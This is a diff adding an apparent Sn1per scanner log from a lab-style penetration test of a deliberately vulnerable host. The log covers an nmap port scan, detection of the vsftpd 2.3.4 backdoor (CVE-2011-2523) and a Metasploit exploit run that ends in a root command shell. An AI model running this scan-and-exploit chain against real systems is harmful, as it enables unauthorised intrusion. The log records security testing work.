@@ -1,0 +1,194 @@
+Starting PostgreSQL 14 database server: main.
+[94m[*][0m Loaded configuration file from /usr/share/sniper/sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Loaded configuration file from /root/.sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Saving loot to /usr/share/sniper/loot/ [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Scanning 172.23.101.159 [94m[[0m[92mOK[0m[94m][0m
+Starting PostgreSQL 14 database server: main.
+[94m[*][0m Loaded configuration file from /usr/share/sniper/sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Loaded configuration file from /root/.sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Saving loot to /usr/share/sniper/loot/workspace/172.23.101.159 [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Scanning 172.23.101.159 [94m[[0m[92mOK[0m[94m][0m
+[91m                ____               [0m
+[91m    _________  /  _/___  ___  _____[0m
+[91m   / ___/ __ \ / // __ \/ _ \/ ___/[0m
+[91m  (__  ) / / // // /_/ /  __/ /    [0m
+[91m /____/_/ /_/___/ .___/\___/_/     [0m
+[91m               /_/                 [0m
+[0m
+[93m + -- --=[https://sn1persecurity.com
+[93m + -- --=[Sn1per v9.0 by @xer0dayz
+[0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m GATHERING DNS INFO [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m CHECKING FOR SUBDOMAIN HIJACKING [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m PINGING HOST [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+PING 172.23.101.159 (172.23.101.159): 56 data bytes
+64 bytes from 172.23.101.159: icmp_seq=0 ttl=64 time=30.810 ms
+--- 172.23.101.159 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 30.810/30.810/30.810/0.000 ms
+
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m RUNNING TCP PORT SCAN [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 10:30 CET
+Nmap scan report for 172.23.101.159
+Host is up (0.081s latency).
+Not shown: 41 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+3632/tcp open  distccd
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6667/tcp open  irc
+8180/tcp open  unknown
+MAC Address: 00:0C:29:26:9F:8A (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds
+
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m RUNNING INTRUSIVE SCANS [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[93m + -- --=[Port 21 opened... running tests...[0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:31)[0mx•
+[91m RUNNING NMAP SCRIPTS [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:31)[0mx•
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 10:31 CET
+NSE: Loaded 54 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:31
+Completed NSE at 10:31, 0.00s elapsed
+Initiating NSE at 10:31
+Completed NSE at 10:31, 0.00s elapsed
+Initiating ARP Ping Scan at 10:31
+Scanning 172.23.101.159 [1 port]
+Completed ARP Ping Scan at 10:31, 0.20s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:31
+Completed Parallel DNS resolution of 1 host. at 10:31, 1.04s elapsed
+Initiating SYN Stealth Scan at 10:31
+Scanning 172.23.101.159 [1 port]
+Discovered open port 21/tcp on 172.23.101.159
+Completed SYN Stealth Scan at 10:31, 0.07s elapsed (1 total ports)
+Initiating Service scan at 10:31
+Scanning 1 service on 172.23.101.159
+Completed Service scan at 10:31, 1.77s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 172.23.101.159
+NSE: Script scanning 172.23.101.159.
+Initiating NSE at 10:31
+NSE: [ftp-bounce 172.23.101.159:21] PORT response: 500 Illegal PORT command.
+NSE Timing: About 70.83% done; ETC: 10:32 (0:00:30 remaining)
+Completed NSE at 10:32, 91.05s elapsed
+Initiating NSE at 10:32
+Completed NSE at 10:32, 0.05s elapsed
+Nmap scan report for 172.23.101.159
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523  BID:48539
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://www.securityfocus.com/bid/48539
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 172.23.101.160
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+MAC Address: 00:0C:29:26:9F:8A (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Uptime guess: 0.825 days (since Sat May 21 14:44:42 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=193 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT      ADDRESS
+1   19.71 ms 172.23.101.159
+
+NSE: Script Post-scanning.
+Initiating NSE at 10:32
+Completed NSE at 10:32, 0.00s elapsed
+Initiating NSE at 10:32
+Completed NSE at 10:32, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.39 seconds
+           Raw packets sent: 24 (2.114KB) | Rcvd: 20 (1.826KB)
+[92m====================================================================================[0m•x[92m[2022-05-22](10:32)[0mx•
+[91m RUNNING METASPLOIT FTP VERSION SCANNER [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:32)[0mx•
+[0mRHOST => 172.23.101.159
+[0mRHOSTS => 172.23.101.159
+[0m[0m[1m[32m[+][0m 172.23.101.159:21     - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
+[1m[34m[*][0m 172.23.101.159:21     - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[0m[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[91m RUNNING METASPLOIT ANONYMOUS FTP SCANNER [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[0mRHOST => 172.23.101.159
+[0mRHOSTS => 172.23.101.159
+[0m[0m[1m[32m[+][0m 172.23.101.159:21     - 172.23.101.159:21 - Anonymous READ (220 (vsFTPd 2.3.4))
+[1m[34m[*][0m 172.23.101.159:21     - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[0m[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[91m RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[0mRHOST => 172.23.101.159
+[0mRHOSTS => 172.23.101.159
+[0mLHOST => 127.0.0.1
+[0mLPORT => 4444
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+[0m[1m[34m[*][0m 172.23.101.159:21 - Banner: 220 (vsFTPd 2.3.4)
+[1m[34m[*][0m 172.23.101.159:21 - USER: 331 Please specify the password.
+[1m[32m[+][0m 172.23.101.159:21 - Backdoor service has been spawned, handling...
+[1m[32m[+][0m 172.23.101.159:21 - UID: uid=0(root) gid=0(root)
+[1m[34m[*][0m Found shell.
+[1m[34m[*][0m Command shell session 1 opened (172.23.101.160:42895 -> 172.23.101.159:6200) at 2022-05-22 10:33:28 +0100
+
+[0m
